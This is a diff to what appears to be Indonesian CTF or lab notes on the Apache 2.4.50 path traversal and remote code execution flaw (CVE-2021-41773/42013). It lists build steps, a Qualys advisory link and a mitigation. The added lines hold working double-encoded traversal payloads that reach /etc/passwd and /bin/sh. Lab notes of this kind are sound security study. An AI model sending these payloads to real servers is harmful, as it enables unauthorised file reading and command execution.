@@ -24,9 +24,11 @@ web simulasi targetnya: web github yang repositorynya public
   - ./httpd-2.4.50/configure --prefix=/usr/local/apache
   - make && make install
   - httpd.conf /conf/httpd.conf
-  - /usr/local/apache/bin/apachectl -k start
-  - /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
-  - http:///icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+    - /usr/local/apache/bin/apachectl -k start
+    - /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+    - /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+    - http:///icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+  - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
 - mitigasi: memperbarui versi apache ke versi terbaru
 
 ## ctf 4
